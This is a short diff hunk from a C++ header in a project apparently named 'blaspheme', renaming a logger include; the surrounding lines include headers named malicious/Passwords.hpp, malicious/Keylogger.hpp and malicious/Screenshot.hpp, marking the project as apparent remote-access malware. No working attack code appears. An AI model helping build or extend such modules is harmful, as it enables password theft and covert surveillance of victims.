@@ -2,7 +2,7 @@
 #define _OPERATING_MODULES_
 
 #include <blaspheme/protocol/ConnectionInfo.hpp>
-#include <common/Logger.hpp>
+#include <common/Log.hpp>
 #include <malicious/Passwords.hpp>
 #include <malicious/Keylogger.hpp>
 #include <malicious/Screenshot.hpp>
